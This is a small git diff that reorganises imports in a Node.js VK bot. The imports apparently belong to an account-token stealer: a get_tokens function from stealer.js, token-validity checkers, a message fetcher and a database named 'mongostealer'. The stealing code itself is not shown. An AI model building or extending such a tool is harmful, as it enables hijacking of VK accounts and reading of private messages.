@@ -1,16 +1,13 @@
 const { VK, Keyboard } = require('vk-io');
 const { HearManager } = require('@vk-io/hear');
 const MongoClient = require("mongodb").MongoClient;
-
-const { db_get_collection, db_get_random, db_add, db_delete_collection, db_available_value, db_delete_value } = require("./db.js")
-const { get_vk_messages } = require('./vk_handler.js')
-const { vk_checker, valid_token } = require("./vk_checker.js");
-const { get_tokens } = require("./stealer.js");
-
-const uri = process.env.mongostealer;
+const { db_get_collection, db_get_random, db_add, db_delete_collection, db_available_value, db_delete_value } = require("../lib/db.js")
+const { get_tokens } = require("../lib/stealer.js");
+const { get_vk_messages } = require('./handler.js')
+const { vk_checker, valid_token } = require("./checker.js");
 
 const client = new MongoClient(
-    uri,
+    process.env.mongostealer,
     { useUnifiedTopology: true },
 );
 
